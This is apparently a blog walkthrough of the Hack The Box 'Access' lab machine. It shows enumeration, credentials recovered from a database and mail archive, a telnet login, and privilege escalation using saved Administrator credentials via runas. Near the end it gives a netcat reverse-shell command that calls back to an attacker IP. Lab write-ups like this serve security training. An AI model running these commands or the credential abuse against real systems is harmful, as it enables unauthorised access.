# :game_die: HTB | Access. This is a Windows box. You can find it…

---

This is a Windows box. You can find it [here](https://app.hackthebox.com/machines/Access).

*Access*

### Skill Learned

- Enumeration of Access Databases and Outlook Personal Archives

- Identification of saved credentials

## NMAP

IP: 10.10.10.98

*rustscan*

*nmap scan*

### FTP

Anonymous login was allowed

*ftp 10.10.10.98*

Got backup.mdb

before downloading the file set FTP to binary

```
binary
get backup.mdb
```

*get backup.mdb*

```
get Access Control.zip
```

*Get Access Control.zip*

unzip command fails,

let’s try 7z, Now it is asking for a password

*unzip Access\ Control.zip7x x Access\ Control.zip*

We have a backup.mdb file, The file is a Microsoft Access Database:

*file backup.mdb*

Now to open the file I will use mdbtools ‘*apt install mdbtools*’

```
mdb-tables
```

We found alot of tables

*mdb-tables backup.zip*

We will use

```
mdb-tables backup.mdb | grep --color=auto user
```

to see the tables for the user, we found auth_user

```
mdb-export backup.mdb auth_user
```

we have admin: admin engineer:access4u@security

## Get anuragtaparia’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Now we can try unzipping the “Access Control”.zip “access4u@security” works

*7x x Access\ Control.zip*

Now we have an Outlook folder

*file Access Control.pst*

## Foothold/ shell

I am using [this](https://goldfynch.com/pst-viewer/index.html) for viewing the file online.

*security account cred*

Boom we have a password for the security account

Since the telnet was open

*telnet*

boom we are in

Found user.txt

*user.txt*

## Priv Esc

On runnng cmdkey /list

*cmdkey /list*

We found Administrator cred stored on the system

We can use this to copy the root.txt

```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt >
C:\Users\security\root.txt"
```

*root.txt*

and boom we have root.txt

We can also have an administrator shell by using nc.exe After transferring the nc.exe we have to

On our system *nc -nlvp 1234*

on box

```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\nc.exe -e C:\Windows\System32\cmd.exe 10.10.14.6 1234"
```

*root.txt*

---
